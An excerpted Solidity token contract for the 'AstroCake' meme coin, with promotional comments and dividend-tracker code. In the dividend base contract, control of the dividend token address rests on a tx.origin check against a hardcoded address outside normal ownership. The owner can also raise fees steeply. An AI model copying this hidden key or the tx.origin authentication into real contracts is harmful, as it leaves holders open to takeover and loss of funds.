...
/**
 *Diamond HANDS ONLY PLEASE :) CHECK OUT OUR v1
*/
...
Reward included, choice to switch the Dividend toekn later on

Join us on TG and social. 

Family and team  is around! 

01/17 - 01/18 Fees to be 15%

01/18 + - FEES Lowered TO 8% 
...
Telegram - https://t.me/AstroCake_meta

Website - https://Astro-metaverse.cc
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x5c780AA343875d29fE54645305F70CA387288868, "Only owner can change dividend contract address");
...
contract AstroCake is ERC20, Ownable {
    ...
    bool public maticDividendEnabled = false;
    ...
    constructor() ERC20("AstroCake", "ASTROCAKE") {
    	maticDividendTracker = new MaticDividendTracker();


    	marketingWallet = 0x8Cb132AA6487b8330CFbCA7aE37840C4A6584ab9;

    	maticDividendToken = 0xCC42724C6683B7E57334c4E856f4c9965ED682bD; // 0xCC42724C6683B7E57334c4E856f4c9965ED682bD Main Matic // 
    ...
    function tradeStart() external onlyOwner {
        ...
        maxWalletToken = 5000000000 * (10**18);
    }
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(maticDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setMaticDividendEnabled(bool _enabled) external onlyOwner {
        require(maticDividendEnabled != _enabled, "Can't set flag to same status");
        if (_enabled == false) {
            ...
            totalFees = maticDividendRewardsFee.add(marketingFee).add(buyBackAndLiquidityFee);
            maticDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(maticDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateMaticDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(maticDividendTracker), "astrocakeback: The dividend tracker already has that address");

        MaticDividendTracker newMaticDividendTracker = MaticDividendTracker(payable(newAddress));

        require(newMaticDividendTracker.owner() == address(this), "astrocakeback: The new dividend tracker must be owned by the astrocakeback token contract");
    ...
    function updateMaticDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 49, "Fee must be less than 49%");
    ...
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = buyBackAndLiquidityFee.add(maticDividendRewardsFee).add(marketingFee);
    }
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (maticDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(maticDividendRewardsFee).mul(maticDividendRewardsFee);
                    swapAndSendMaticDividends(sellTokens.div(10**2).mul(rand()));
                }
...
contract MaticDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("astrocakeback_Dividend_Tracker", "astrocakeback_Dividend_Tracker", 0xCC42724C6683B7E57334c4E856f4c9965ED682bD) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 150000 * (10**18); //must hold 150,000+++ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "astrocakeback_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "astrocakeback_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "astrocakeback_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "astrocakeback_Dividend_Tracker: Cannot update claimWait to same value");
